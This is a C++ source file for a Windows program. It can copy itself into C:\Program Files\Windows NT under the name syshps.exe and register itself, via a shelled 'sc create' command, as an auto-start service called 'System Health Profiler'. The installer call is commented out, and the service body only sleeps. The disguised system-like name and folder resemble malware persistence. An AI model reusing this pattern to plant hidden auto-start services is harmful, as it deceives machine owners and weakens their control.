#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "global.h"
#include "log4c.h"

#include "daemon.h"

const wchar_t* SVC_NAME = L"syshps";
const wchar_t* DST_BIN = L"C:\\Program Files\\Windows NT\\syshps.exe";
static SERVICE_STATUS svcStat_;
static SERVICE_STATUS_HANDLE svcHandle_;

extern void init_as_test();

void WINAPI svc_ctrl_handler(DWORD ctrlCode)
{
	switch(ctrlCode) {
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			svcStat_.dwCurrentState = SERVICE_STOPPED;
			break;
		default:break;	
	}
	::SetServiceStatus(svcHandle_, &svcStat_);
}

void WINAPI svc_main(DWORD dwArgc, wchar_t** lpszArgv) 
{
	svcHandle_ = ::RegisterServiceCtrlHandlerW(SVC_NAME, svc_ctrl_handler);
	svcStat_.dwCurrentState = SERVICE_RUNNING;
	svcStat_.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	svcStat_.dwServiceSpecificExitCode = 0;
	
	::SetServiceStatus(svcHandle_, &svcStat_);
	while (svcStat_.dwCurrentState != SERVICE_STOPPED) {
		::Sleep(100);
	}
}

void init_as_ntsvc()
{
	wchar_t svcName[] = L"SysHealthProfiler";
	SERVICE_TABLE_ENTRYW st[2];
	st[0].lpServiceName = svcName;
	st[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)svc_main;
	st[1].lpServiceName = NULL;
	st[1].lpServiceProc = NULL;
	::StartServiceCtrlDispatcherW(st);
}

void init_as_installer()
{
	wchar_t buf[MAX_PATH];
	memset(buf, 0, sizeof(wchar_t) * MAX_PATH);
	::GetModuleFileNameW(NULL, buf, MAX_PATH);
	wstring bin(buf);
	::CopyFileW(bin.c_str(), DST_BIN, true);
	
	wstring injectCmd = str_format(
		L"sc create Syshps binPath= \"%s svc\" start= auto DisplayName= \"System Health Profiler\"", 
		DST_BIN
	);
	
	wprintf(L"%s\n", injectCmd.c_str());
	_wsystem(injectCmd.c_str());
}

void init_daemons() {
	DaemonWalker daemonWalker;
	daemonWalker.start();
	
	do {
		::Sleep(500);
	} while (daemonWalker.isEnd() != true);
}

int main(int argc, char **argv)
{
	wstring logFile(L"my.log");
	Log4c::setLogFile(logFile);
	
	if (argc > 1) {
		std::string cmd(argv[1]);
		if (cmd.compare("svc") == 0) {
			init_as_ntsvc();
		} else {
			init_as_test();
		}
	} else {
		//init_as_installer();
		init_daemons();
		init_as_test();
	}
	
	Log4c::Release();
	return 0;
}
